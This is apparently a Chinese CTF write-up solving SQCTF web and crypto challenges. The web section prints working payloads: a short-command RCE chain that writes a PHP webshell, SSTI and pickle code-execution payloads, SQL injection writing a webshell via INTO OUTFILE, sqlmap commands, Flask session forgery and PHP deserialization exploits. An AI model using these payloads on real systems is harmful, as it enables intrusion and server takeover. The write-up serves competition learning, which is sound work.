\u0026gt;S}\\\\ \u0026gt;IF\\\\ \u0026gt;{\\\\ \u0026gt;\\$\\\\ \u0026gt;o\\\\ \u0026gt;ch\\\\ \u0026gt;e\\\\ sh _ sh y 解释一下\n1 2 3 4 5 6 7 8 \u0026gt;ls\\\\ # 创建文件名为 \u0026#34;ls\\\u0026#34; ls\u0026gt;_ # 将当前目录文件列表（含\u0026#34;ls\\\u0026#34;）写入文件 \u0026#34;_\u0026#34; \u0026gt;\\ \\\\ # 创建文件名为空格 \u0026#34; \u0026#34; \u0026gt;-t\\\\ # 创建文件名为 \u0026#34;-t\\\u0026#34; \\\u0026gt;y # 创建文件名为 \u0026#34;\u0026gt;y\u0026#34; ls\u0026gt;\u0026gt;_ # 将当前文件列表追加到 \u0026#34;_\u0026#34; 所以文件_内容是\n1 2 3 4 ls\\ -t\\ \u0026gt;y (这里当执行sh_时，文件_ 内容被解析为命令，实际触发ls -t \u0026gt;y，生成文件y)\n构造木马\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026gt;hp \u0026gt;p\\\\ \u0026gt;1.\\\\ \u0026gt;\\\u0026gt;\\\\ \u0026gt;-d\\\\ \u0026gt;\\ \\\\ \u0026gt;64\\\\ \u0026gt;se\\\\ \u0026gt;ba\\\\ \u0026gt;\\|\\\\ \u0026gt;\\=\\\\ \u0026gt;w=\\\\ \u0026gt;pO\\\\ \u0026gt;V0\\\\ \u0026gt;bM\\\\ \u0026gt;1R\\\\ \u0026gt;PU\\\\ \u0026gt;1B\\\\ \u0026gt;kX\\\\ \u0026gt;Cg\\\\ \u0026gt;hb\\\\ \u0026gt;XZ\\\\ \u0026gt;gZ\\\\ \u0026gt;HA\\\\ \u0026gt;a\\\\ \u0026gt;9w\\\\ \u0026gt;PD\\\\ \u0026gt;S}\\\\ \u0026gt;IF\\\\ \u0026gt;{\\\\ \u0026gt;\\$\\\\ \u0026gt;o\\\\ \u0026gt;ch\\\\ \u0026gt;e\\\\ 经过ls -t 排序后就是echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==|base64${IFS}-d\u0026gt;1.php\n执行sh_ 触发y生成，然后执行y将上面拼接成完成命令写入木马\nCTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总_ctf中字符长度限制下的命令执行 5个字符-CSDN博客\n有长度限制的rce - xiaolong\u0026rsquo;s blog\nInput a number Ez_calculate ai一把梭，flag在/flag，逆天本来目录爆破就有的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 import requests import re import time from bs4 import BeautifulSoup TARGET_URL = \u0026#34;http://challenge.qsnctf.com:32621/\u0026#34; MAX_TIME = 1.9 # 最大允许时间（留出0.1秒余量） RETRY_DELAY = 0.01 # 失败后重试间隔 def solve_challenge(): session = requests.Session() session.headers.update({ \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;, \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 CTF Solver\u0026#39; }) while True: start_time = time.perf_counter() response_text = \u0026#34;\u0026#34; try: # 1. 快速获取页面 try: response = session.get(TARGET_URL, timeout=0.3) if response.status_code != 200: print(f\u0026#34;[!] 获取失败 HTTP {response.status_code}\u0026#34;) time.sleep(RETRY_DELAY) continue except requests.exceptions.RequestException as e: print(f\u0026#34;[!] 连接错误: {str(e)}\u0026#34;) time.sleep(RETRY_DELAY) continue # 2. 快速解析数学题目 soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) challenge_div = soup.find(\u0026#39;div\u0026#39;, class_=\u0026#39;challenge\u0026#39;) if not challenge_div: print(\u0026#34;[!] 未找到题目div\u0026#34;) time.sleep(RETRY_DELAY) continue problem_text = challenge_div.text.strip() print(f\u0026#34;[+] 当前题目: {problem_text}\u0026#34;) # 3. 安全计算答案（支持多运算符） try: # 使用更安全的计算方式替代eval def safe_calc(expr): tokens = re.findall(r\u0026#39;(\\d+|[\\+\\-\\*/])\u0026#39;, expr.replace(\u0026#39; \u0026#39;, \u0026#39;\u0026#39;)) total = int(tokens[0]) for i in range(1, len(tokens), 2): op, num = tokens[i], int(tokens[i+1]) if op == \u0026#39;+\u0026#39;: total += num elif op == \u0026#39;-\u0026#39;: total -= num elif op == \u0026#39;*\u0026#39;: total *= num elif op == \u0026#39;/\u0026#39;: total //= num return total answer = safe_calc(problem_text) print(f\u0026#34;[√] 计算结果: {answer}\u0026#34;) except Exception as e: print(f\u0026#34;[!] 计算错误: {str(e)}\u0026#34;) time.sleep(RETRY_DELAY) continue # 4. 快速提交并获取响应 elapsed = time.perf_counter() - start_time remaining_time = max(0.05, MAX_TIME - elapsed) try: submit_response = session.post( TARGET_URL, data={\u0026#39;value\u0026#39;: answer}, timeout=(0.2, remaining_time) ) total_time = (time.perf_counter() - start_time) * 1000 print(f\u0026#34;[↑] 提交成功! 用时: {total_time:.1f}ms\u0026#34;) # 打印完整响应 print(\u0026#34;\\n\u0026#34; + \u0026#34;=\u0026#34;*40) print(\u0026#34;服务器响应:\u0026#34;) print(submit_response.text) print(\u0026#34;=\u0026#34;*40 + \u0026#34;\\n\u0026#34;) # 检查CTF标志 if re.search(r\u0026#39;ctf|CTF\u0026#39;, submit_response.text, re.IGNORECASE): print(\u0026#34;[★] 发现CTF标志，挑战完成！\u0026#34;) return submit_response.text except requests.exceptions.Timeout: print(f\u0026#34;[!] 提交超时 (剩余时间: {remaining_time*1000:.1f}ms)\u0026#34;) except requests.exceptions.RequestException as e: print(f\u0026#34;[!] 提交错误: {str(e)}\u0026#34;) except Exception as e: print(f\u0026#34;[!] 系统错误: {str(e)}\u0026#34;) # 精确控制重试间隔 elapsed = time.perf_counter() - start_time if elapsed \u0026lt; RETRY_DELAY: time.sleep(RETRY_DELAY - elapsed) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;=\u0026#34;*50) print(\u0026#34;高速数学挑战解题器 - 2秒限时模式\u0026#34;) print(\u0026#34;=\u0026#34;*50) result = solve_challenge() if result: with open(\u0026#34;ctf_flag.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(result) print(\u0026#34;响应已保存到 ctf_flag.txt\u0026#34;) Upload_Level2 上面的文件上传是前端检测，这个是content检测，其实只要先上传一个图片马，然后改成php即可，开始想的很麻烦，用.user.ini想秒，但是不知道为啥没成功，仔细一下就这样秒了，太思维定式了。\nbaby rce 直接秒\n白月光 测出来是ssti，没测waf，直接打payload，运气不错\n1 {{lipsum[\u0026#39;\\x5f\\x5fglob\u0026#39;\u0026#39;als\\x5f\\x5f\u0026#39;][\u0026#39;o\u0026#39;\u0026#39;s\u0026#39;].popen(\u0026#39;cat /fla?\u0026#39;).read()}} 小小查询系统-（写马连数据库） 解法一：打一句话木马 1 id=-1\u0026#39; union select 1,2,\u0026#39;\u0026lt;?php eval($_REQUEST[1]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/1.php\u0026#39;--+ 然后蚁剑连接，文件里面的flag是假的，先找到源码，发现连接数据库的用户密码（其实源码都在网站目录下面，cat *所有源码就出来了，或者连接上一个个查看也行）\n连接后发现flag再cft里面\n解法二：手动注入 首先看多少列\n1 id=1\u0026#39; order by 3--+ 发现回显是2，3\n1 id=-1\u0026#39; union select 1,2,3--+ 接下来要查数据库，这个就很难受了，一般我们都是直接打下面的payload看数据库\n1 id=-1\u0026#39; union select 1,2,database()--+ 甚至不查数据库，直接查表\n1 -1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database();--+ 但是此题就不行，上面我用木马打进了数据库然后查看了其源码，发现其默认登入的数据库是security\n所以就必须指定数据库，所以就应该从查数据库开始\n1 -1\u0026#39; union select 1,2,group_concat(schema_name)from information_schema.schemata--+ 接下来就简单了，查表\n1 id=-1\u0026#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=\u0026#39;ctf\u0026#39;--+ 查字段\n1 id=-1\u0026#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=\u0026#39;flag\u0026#39;--+ 查内容，这里要注意要写ctf.flag,写flag的话是默认security的库，所以加上ctf指定ctf的库\n1 id=-1\u0026#39; union select 1,2,group_concat(id,value)from ctf.flag--+ 解法三：sqlmap注入 报错注入，先查所有数据库（报错注入更快）\n1 python sqlmap.py -u \u0026#34;http://challenge.qsnctf.com:31427/?id=1\u0026#34; --batch --technique=E -dbs 不一一演示\n直接找flag\n1 python sqlmap.py -u \u0026#34;http://challenge.qsnctf.com:31427/?id=1\u0026#34; --batch --technique=E -dbs -D ctf -T flag --dump 布尔盲注，先查数据库\n1 python sqlmap.py -u \u0026#34;http://challenge.qsnctf.com:31427/?id=1\u0026#34; -p id --random-agent --fresh-queries --no-cast --technique=B -dbs 接下来不多演示\n1 python sqlmap.py -u \u0026#34;http://challenge.qsnctf.com:31427/?id=1\u0026#34; -p id --random-agent --fresh-queries --no-cast --technique=B -D ctf -T flag -C \u0026#34;`id`,`value`\u0026#34; --dump 无参之舞 先扫描目录\n1 var_dump(file_get_contents(%27f1ag.php%27)); 哎呀大大大黑塔 GET传SQNU=BV1tXckehEd3（就bv号）\n之后就简单了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php class Secret { public $key; public function __construct($key) { $this-\u0026gt;key = $key; } public function __destruct() { if ($this-\u0026gt;key === \u0026#34;SQCTF\u0026#34;) { include \u0026#34;./flag.php\u0026#34;; echo \u0026#34;flag : \u0026#34;.$flag; } else { echo \u0026#34;Try harder!\u0026#34;; } } } $a=new Secret($key); $a-\u0026gt;key=\u0026#34;SQCTF\u0026#34;; echo serialize($a); echo \u0026#34;\\n\u0026#34;.urlencode(serialize($a)).\u0026#34;\\n\u0026#34;; 出的很怪。\n伪装 先seesion解密\n1 修改{\u0026#39;role\u0026#39;: {\u0026#39;is_admin\u0026#39;: 0, \u0026#39;name\u0026#39;: \u0026#39;aiyamaya\u0026#39;}}为{\u0026#39;role\u0026#39;: {\u0026#39;is_admin\u0026#39;: 1, \u0026#39;name\u0026#39;: \u0026#39;sjx\u0026#39;}} 参考:[HCTF 2018]admin \u0026mdash; flask session 的加密解密_session解密-CSDN博客\n图片展示功能 就是打.htaccess\n之后蚁剑连接就好\n开发人员的小失误 扫描出来\n打开就是flag\nggoodd Are you from SQNU? 按下按钮有参数tyctf，然后用这个参数post随便传，然后出现提示（之后这个tyctf不能删，否则打不通）\n接下来安装提示打就行\n接下来太简单了，不一一展示\nLook for the homepage pickle 最基础的pickle\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 import pickle import base64 import os class A(object): def __reduce__(self): return (eval, (\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;tac /flag\u0026#39;).read()\u0026#34;,)) payload = pickle.dumps(A()) b64_payload = base64.b64encode(payload) print(payload) print(b64_payload.decode()) 千查万别 先读/app/app.py得到源码，分析一下源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 \u0026lt;pre\u0026gt;from flask import Flask, request, render_template_string, session import os app = Flask(__name__) app.secret_key = os.environ.get(\u0026#39;SECRET_KEY\u0026#39;, os.urandom(16)) @app.route(\u0026#39;/\u0026#39;) def index(): username = session.get(\u0026#39;username\u0026#39;, \u0026#39;guest\u0026#39;) template = f\u0026#39;\u0026#39;\u0026#39; \u0026lt;h1\u0026gt;欢迎，{username}！\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/view\u0026#34; method=\u0026#34;GET\u0026#34;\u0026gt; 输入文档ID: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;doc\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;查看\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026#39;\u0026#39;\u0026#39; return render_template_string(template) @app.route(\u0026#39;/view\u0026#39;) def view_doc(): doc = request.args.get(\u0026#39;doc\u0026#39;, \u0026#39;test.txt\u0026#39;) base_dir = \u0026#39;/app/static/docs\u0026#39; filepath = os.path.realpath(os.path.join(base_dir, doc)) if filepath == \u0026#39;/flag\u0026#39;: return \u0026#34;非法路径！\u0026#34; try: with open(filepath, \u0026#39;r\u0026#39;) as f: content = f.read() return f\u0026#34;\u0026lt;pre\u0026gt;{content}\u0026lt;/pre\u0026gt;\u0026#34; except: return \u0026#34;文档不存在！\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;) \u0026lt;/pre\u0026gt; 看到render_template_string(template) 显然就是打ssti，注入点是seesion里的username，所以要进行session加密解密，key在环境变量里，用/proc/self/environ 就可以看到了\n1 Dark_Flame 接下来session伪造可以用工具伪造（但是原session不可以解密？？那只能直接伪造其中的数据）\n也可以用代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 from flask import Flask, session from flask.sessions import SecureCookieSessionInterface import base64 import json import os app = Flask(__name__) app.secret_key = \u0026#34;Dark_Flame\u0026#34; # 创建一个会话对象 session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) # 要序列化的数据 data = { \u0026#39;username\u0026#39;: \u0026#34;{{lipsum.__globals__.os.popen(\u0026#39;cat /flag\u0026#39;).read()}}\u0026#34; } # 序列化并加密数据 serialized = session_serializer.dumps(data) print(\u0026#34;Encoded session:\u0026#34;, serialized) # 如果需要解码，可以使用以下代码 decoded = session_serializer.loads(serialized) print(\u0026#34;Decoded session:\u0026#34;, decoded) Look for the homepage 打开标头看见路由\n然后一个这个\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php error_reporting(0); include(\u0026#34;flag.php\u0026#34;); highlight_file(__FILE__); // 怎么在不知道flag.php中的code和flag的情况下绕过? 我不造啊!!! if(isset($_GET[\u0026#39;pass1\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;pass2\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;verify\u0026#39;])){ $pass1 = (String)$_GET[\u0026#39;pass1\u0026#39;]; $pass2 = (String)$_GET[\u0026#39;pass2\u0026#39;]; $verify_code = (String)$_GET[\u0026#39;verify\u0026#39;]; if($verify_code === $code \u0026amp;\u0026amp;$pass1 === $flag || $pass2 === \u0026#34;welcome\u0026#34;){ echo \u0026#34;Level1 Pass\\n\u0026#34;; echo \u0026#34;关关难过关关过 !!!\u0026#34;; if(isset($_POST[\u0026#39;value1\u0026#39;])){ $value1 = $_POST[\u0026#39;value1\u0026#39;]; $value3 = $_GET[\u0026#39;value3\u0026#39;]; parse_str($value1,$a); if($a[\u0026#39;fly\u0026#39;]==md5($value3)){ echo \u0026#34;Level2 Pass\\n\u0026#34;; echo $flag; } } else{ echo \u0026#34;想想看parse_str是干嘛的来着\\n\u0026#34;; } } else{ echo \u0026#34;你小子就是这样绕过的吗 ???\\n\u0026#34;; } } 简单考个md5与parse_str性质\n自私的小s 提示入口可能不对，抓包发现在cookie\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php highlight_file(__FILE__); class Genshin_impact{ private $value; public function __construct($v){ $this-\u0026gt;value = $v; } function __destruct(){ echo eval($this-\u0026gt;value); } } $payload=$_GET[\u0026#39;payload\u0026#39;]; $payload=str_replace(\u0026#34;%\u0026#34;,\u0026#34;nonono\u0026#34;,$payload); unserialize($payload); ?\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php class Genshin_impact{ private $value; public function __construct($v){ $this-\u0026gt;value = $v; } function __destruct(){ echo eval($this-\u0026gt;value); } } $a=new Genshin_impact(\u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;); echo urlencode(serialize($a)); 1 O%3A14%3A%22Genshin_impact%22%3A1%3A%7Bs%3A21%3A%22%00Genshin_impact%00value%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D 这里由于过滤了%，所以要url编码\nCrypto 春风得意马蹄疾 社会主义编码，嵌套了几次，一直解码社会主义解码即可\n别阴阳我了行吗？ 直接解码\nbase？ base64换表，直接去厨子里面尝试这些表即可\n简单RSA ai一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from Crypto.Util.number import long_to_bytes # 公钥和密文参数 e = 65537 n = 7349515423675898192891607474991784569723846586810596813062667159281369435049497248016288479718926482987176535358013000103964873016387433732111229186113030853959182765814488023742823409594668552670824635376457830121144679902605863066189568406517231831010468189513762519884223049871926129263923438273811831862385651970651114186155355541279883465278218024789539073180081039429284499039378226284356716583185727984517316172565250133829358312221440508031140028515954553016396884149904097959425582366305748700291610280675014390376786701270107136492645593662763444032174543205008326706371954830419775515459878227148997362533 c = 3514741378432598036735573845050830323348005144476193092687936757918568216312321624978086999079287619464038817665467748860146219342413630364856274551175367026504110956407511224659095481178589587424024682256076598582558926372354316897644421756280217349588811321954271963531507455604340199167652015645135632177429144241732132275792156772401511326430069756948298403519842679923368990952555264034164975975945747016304948179325381238465171723427043140473565038827474908821764094888942553863124323750256556241722284055414264534546088842593349401380142164927188943519698141315554347020239856047842258840826831077835604327616 # 分解 n 得到的质因数 p 和 q p = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863611867388261 q = 85729314844316224669788680650977264735589729061816788627612566392188298017717541385878388569465166835406950222982743897376939980435155664145111997305895651382483557180799129871344729666249390412399389403988459762024929767702864073925613168913279047262718022068944038280618279450911055132404010863614460682753 # 验证 p 和 q 是否正确（关键步骤！） assert p * q == n, \u0026#34;分解错误：p * q ≠ n\u0026#34; # 计算欧拉函数 φ(n) phi = (p - 1) * (q - 1) # 计算私钥 d（e 的模逆元） d = pow(e, -1, phi) # 解密密文 c m = pow(c, d, n) # 将明文转换为字节并输出 plaintext = long_to_bytes(m) # 尝试 UTF-8 解码，失败则直接输出字节 try: print(plaintext.decode(\u0026#39;utf-8\u0026#39;)) except UnicodeDecodeError: print(\u0026#34;解密后的字节流（可能包含非 UTF-8 字符）:\u0026#34;, plaintext) factordb.com：分解网站\nezCRT 依旧deepseek一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import math from functools import reduce import gmpy2 from Crypto.Util.number import long_to_bytes # 给定参数（保持不变） n1 = 64461804435635694137780580883118542458520881333933248063286193178334411181758377012632600557019239684067421606269023383862049857550780830156513420820443580638506617741673175086647389161551833417527588094693084581758440289107240400738205844622196685129086909714662542181360063597475940496590936680150076590681 n2 = 82768789263909988537493084725526319850211158112420157512492827240222158241002610490646583583091495111448413291338835784006756008201212610248425150436824240621547620572212344588627328430747049461146136035734611452915034170904765831638240799554640849909134152967494793539689224548564534973311777387005920878063 n3 = 62107516550209183407698382807475681623862830395922060833332922340752315402552281961072427749999457737344017533524380473311833617485959469046445929625955655230750858204360677947120339189429659414555499604814322940573452873813507553588603977672509236539848025701635308206374413195614345288662257135378383463093 c1 = 36267594227441244281312954686325715871875404435399039074741857061024358177876627893305437762333495044347666207430322392503053852558456027453124214782206724238951893678824112331246153437506819845173663625582632466682383580089960799423682343826068770924526488621412822617259665379521455218674231901913722061165 c2 = 58105410211168858609707092876511568173640581816063761351545759586783802705542032125833354590550711377984529089994947048147499585647292048511175211483648376727998630887222885452118374649632155848228993361372903492029928954631998537219237912475667973649377775950834299314740179575844464625807524391212456813023 c3 = 23948847023225161143620077929515892579240630411168735502944208192562325057681298085309091829312434095887230099608144726600918783450914411367305316475869605715020490101138282409809732960150785462082666279677485259918003470544763830384394786746843510460147027017747048708688901880287245378978587825576371865614 # 验证模数互质 assert math.gcd(n1, n2) == 1 and math.gcd(n1, n3) == 1 and math.gcd(n2, n3) == 1, \u0026#34;模数不互质\u0026#34; # 中国剩余定理（CRT）合并 def crt(remainders, moduli): N = reduce(lambda x, y: x * y, moduli) result = 0 for r, m in zip(remainders, moduli): Ni = N // m inv = pow(Ni, -1, m) result += r * Ni * inv return result % N m_cubed = crt([c1, c2, c3], [n1, n2, n3]) # 计算立方根并验证精确性 m, is_exact = gmpy2.iroot(m_cubed, 3) if not is_exact: raise ValueError(\u0026#34;立方根不精确，可能存在错误\u0026#34;) # 转换为字节流 plaintext = long_to_bytes(m) # 精确提取 Flag（根据已知前缀 \u0026#34;SQCTF{\u0026#34; 手动定位） flag_start = plaintext.find(b\u0026#39;SQCTF{\u0026#39;) # 搜索 Flag 起始位置 if flag_start != -1: flag_end = plaintext.find(b\u0026#39;}\u0026#39;, flag_start) + 1 # 找到闭合的 \u0026#39;}\u0026#39; flag = plaintext[flag_start:flag_end].decode(\u0026#39;utf-8\u0026#39;) else: # 暴力扫描可打印字符 flag_bytes = [] for b in plaintext: if 32 \u0026lt;= b \u0026lt;= 126: # ASCII 可打印范围 flag_bytes.append(b) else: break # 遇到非打印字符终止 flag = bytes(flag_bytes).decode(\u0026#39;utf-8\u0026#39;, \u0026#39;ignore\u0026#39;) print(\u0026#34;解密结果:\u0026#34;, flag) 失落矿洞中的密码 deepseek一把梭，然后在线找个sage环境\n小白兔白又白 随波逐流一把梭加rabbit解密\n丢三落四的小I 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import gmpy2 from Crypto.Util.number import long_to_bytes n = 15124759435262214519214613181859115868729356369274819299240157375966724674496904855757710168853212365134058977781083245051947523020090726851248565503324715984500225724227315777864292625995636236219359256979887906731659848125792269869019299002807101443623257106289957747665586226912446158316961637444556237354422346621287535139897525295200592525427472329815100310702255593134984040293233780616515067333512830391860868933632383433431739823740865023004008736555299772442805617275890761325372253913686933294732259451820332316315205537055439515569011020072762809613676347686279082728000419370190242778504490370698336750029 e = 65537 dp = 1489209342944820124277807386023133257342259912189247976569642906341314682381245025918040456151960704964362424182449567071683886673550031774367531511627163525245627333820636131483140111126703748875380337657189727259902108519674360217456431712478937900720899137512461928967490562092139439552174099755422092113 c = 4689152436960029165116898717604398652474344043493441445967744982389466335259787751381227392896954851765729985316050465252764336561481633355946302884245320441956409091576747510870991924820104833541438795794034004988760446988557417649875106251230110075290880741654335743932601800868983384563972124570013568709773861592975182534005364811768321753047156781579887144279837859232399305581891089040687565462656879173423137388006332763262703723086583056877677285692440970845974310740659178040501642559021104100335838038633269766591727907750043159766170187942739834524072423767132738563238283795671395912593557918090529376173 # 恢复 p for k in range(1, e): p = (e * dp - 1) // k + 1 if n % p == 0: break print(f\u0026#34;Found p: {p}\u0026#34;) # 计算 q 和 φ(n) q = n // p phi = (p - 1) * (q - 1) # 计算私钥 d d = gmpy2.invert(e, phi) # 解密消息 m = pow(c, d, n) print(f\u0026#34;Decrypted message: {long_to_bytes(m)}\u0026#34;) 密室逃脱的终极挑战 字母的轮舞与维吉尼亚的交响曲 维吉尼亚解密然后一眼看到flag得加密字符\n一眼凯撒，随波逐流梭：SQCTF{you_are_win!}\n玩的挺变态啊清茶哥 截图片下面的字符然后谷歌识图,发现是猪圈密码\n找个在线网站直接打\nez_SCA ai一把梭\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 import numpy as np # 加载模板轨迹 template_trace_0 = np.load(\u0026#39;template_trace_0.npy\u0026#39;) template_trace_1 = np.load(\u0026#39;template_trace_1.npy\u0026#39;) # 加载能量轨迹 traces = np.load(\u0026#39;energy_traces_with_flag.npy\u0026#39;) def moving_average_filter(trace, window_size=5): \u0026#34;\u0026#34;\u0026#34; 使用移动平均滤波对能量轨迹进行降噪处理。 \u0026#34;\u0026#34;\u0026#34; filtered_trace = np.convolve(trace, np.ones(window_size) / window_size, mode=\u0026#39;valid\u0026#39;) return filtered_trace def compare_trace_with_templates(trace, template_0, template_1): \u0026#34;\u0026#34;\u0026#34; 使用欧氏距离比较能量轨迹与模板轨迹的相似性，返回对应的二进制位（0 或 1）。 \u0026#34;\u0026#34;\u0026#34; # 对能量轨迹进行滤波处理 filtered_trace = moving_average_filter(trace) # 确保滤波后的能量轨迹和模板轨迹的形状一致 min_length = min(len(filtered_trace), len(template_0)) filtered_trace = filtered_trace[:min_length] template_0 = template_0[:min_length] template_1 = template_1[:min_length] # 计算与模板轨迹 0 的欧氏距离 dist_0 = np.linalg.norm(template_0 - filtered_trace) # 计算与模板轨迹 1 的欧氏距离 dist_1 = np.linalg.norm(template_1 - filtered_trace) # 比较距离，选择更小的距离对应的位 if dist_0 \u0026lt; dist_1: return \u0026#39;0\u0026#39; else: return \u0026#39;1\u0026#39; def bits_to_text(bits): \u0026#34;\u0026#34;\u0026#34; 将二进制位转换为文本。 \u0026#34;\u0026#34;\u0026#34; chars = [bits[i:i + 8] for i in range(0, len(bits), 8)] text = \u0026#39;\u0026#39;.join([chr(int(char, 2)) for char in chars]) return text # 初始化存储位的列表 bits = [] # 遍历每个能量轨迹 for trace in traces: bit = compare_trace_with_templates(trace, template_trace_0, template_trace_1) bits.append(bit) # 将列表转换为字符串 bits_str = \u0026#39;\u0026#39;.join(bits) # 转换二进制位为文本 flag = bits_to_text(bits_str) print(\u0026#34;恢复的明文 flag:\u0026#34;, flag) 你的天赋是什么 摩斯密码直接秒\n将%u7b替换成{即可。SQCTF{YOU-HAVE-TALENT}\nCommon Modulus ai梭。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import math from libnum import n2s def extended_gcd(a, b): if b == 0: return (a, 1, 0) else: g, x, y = extended_gcd(b, a % b) return (g, y, x - (a // b) * y) # 题目参数 n = 13650503560233612352420237787159267432351878281073422449253560365809461612884248041710373755322100953953257608601227381211434513766352420535096028618735289379355710140356003114010103377509526452574385251495847301426845768427018504464757671958803807138699056193259160806476941875860254288376872925837127208612702688503022494109785623082365323949385021488106289708499091818714253710552213982060745736652306892896670424179736886691685639988637188591805479432332714690818805432648223229601082431517091667297328748597580733946557364100555781113940729296951594110258088501146224322799560159763097710814171619948719257894889 c1 = 3366500968116867439746769272799247895217647639427183907930755074259056811685671593722389247697636905214269760325119955242254171223875159785479900114989812511815466122321484289407596620307636198001794029251197349257235827433633936216505458557830334779187112907940003978773672225479445837897135907447625387990203145231671233038707457396631770623123809080945314083730185110252441203674945146889165953135351824739866177205127986576305492490242804571570833778440870959816207461376598067538653432472043116027057204385251674574207749241503571444801505084599753550983430739025050926400228758055440679102902069032768081393253 c2 = 7412517103990148893766077090616798338451607394614015195336719617426935439456886251056015216979658274633552687461145491779122378237012106236527924733047395907133190110919550491029113699835260675922948775568027483123730185809123757000207476650934095553899548181163223066438602627597179560789761507989925938512977319770704123979102211869834390476278761480516444396187746843654541476645830961891622999425268855097938496239480682176640906218645450399785130931214581370821403077312842724336393674718200919934701268397883415347122906912693921254353511118129903752832950063164459159991128903683711317348665571285175839274346 e1 = 4217054819 e2 = 2800068527 # 验证指数互质 assert math.gcd(e1, e2) == 1, \u0026#34;e1和e2必须互质\u0026#34; # 扩展欧几里得算法求a和b g, a, b = extended_gcd(e1, e2) # 计算明文 if a \u0026lt; 0: c1_inv = pow(c1, -1, n) part1 = pow(c1_inv, -a, n) else: part1 = pow(c1, a, n) if b \u0026lt; 0: c2_inv = pow(c2, -1, n) part2 = pow(c2_inv, -b, n) else: part2 = pow(c2, b, n) m = (part1 * part2) % n # 转换为字符串 flag = n2s(m) print(\u0026#34;Flag:\u0026#34;, flag.decode()) 《1789年的密文》 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import re table = [4, 2, 11, 8, 9, 12, 3, 6, 10, 14, 1, 5, 7, 13] Ciphertext = \u0026#39;UNEHJPBIUOMAVZ\u0026#39; with open(r\u0026#39;1.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: data = f.read() # 转轮机根据table重新排列 def wheel_decode(data, table): resultList = [] pattern = re.compile(\u0026#39;[A-Z]{26}\u0026#39;) result = pattern.findall(data) for i in table: resultList.append(result[i-1]) return resultList resultList = wheel_decode(data, table) # 根据密文重新排列 def rearrange(List, Ciphertext): resultList = [] for i in range(0, 14): # 修正循环次数为14（对应14个转轮） resultList.append(List[i][List[i].find(Ciphertext[i]):] + List[i][:List[i].find(Ciphertext[i])]) return resultList resultList = rearrange(resultList, Ciphertext) # 选取每一列，列出结果 def rearrange2(List): resultList = [] s = \u0026#39;\u0026#39; for i in range(0, 26): for j in List: s += j[i] resultList.append(s.lower()) # 直接在此处转换为小写[1,2](@ref) s = \u0026#39;\u0026#39; return resultList resultList = rearrange2(resultList) for i in resultList: print(i) 参考：XCTF-crypto\u0026mdash;转轮机加密 - 我是球啊 - 博客园\nmisc Welcome_Sign_in 